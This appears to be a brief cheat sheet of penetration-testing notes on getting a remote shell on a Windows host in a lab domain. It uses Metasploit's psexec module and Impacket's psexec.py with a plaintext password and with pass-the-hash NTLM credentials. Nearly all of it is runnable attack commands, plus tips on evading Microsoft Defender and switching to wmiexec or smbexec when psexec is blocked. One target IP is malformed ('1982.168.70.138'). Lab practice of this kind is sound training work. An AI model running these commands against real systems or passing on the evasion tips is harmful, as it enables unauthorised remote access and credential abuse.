# Gaining Shell Access with MSFconsole

## Usage

- use MSFCONSOLE: exploit/windows/smb/psexec
```bash
msfconsole
search exploit/windows/smb/psexec
use 0
```
### Using a Password

```bash
options
set RHOSTS 192.168.70.138
set SMBDomain MARVEL.local
set SMBUser fcastle
set SMBPass Password1
run
```

### Using a hash

```bash
unset smbdomain
set RHOSTS 192.168.70.138
set SMBUser administrator
set SMBPass ad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
run
```
# Gaining Shell Access manually
## Usage

### Using a Password

- run psexec.py
```bash
psexec.py MARVEL/fcastle:'Password1'@192.168.70.138
```

- In case of weird passwords:
```bash
psexec.py MARVEL/fcastle:@192.168.70.138
# Input Password now
Password1
```

## Using a hash (not detected by MicrosoftDefender)

```bash
psexec.py administrator@1982.168.70.138 -hashes ad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

# Notes:

- if "psexec.py" is getting blocked try "wmiexec.py" or "smbexec.py"
- depending on settings some might work and others not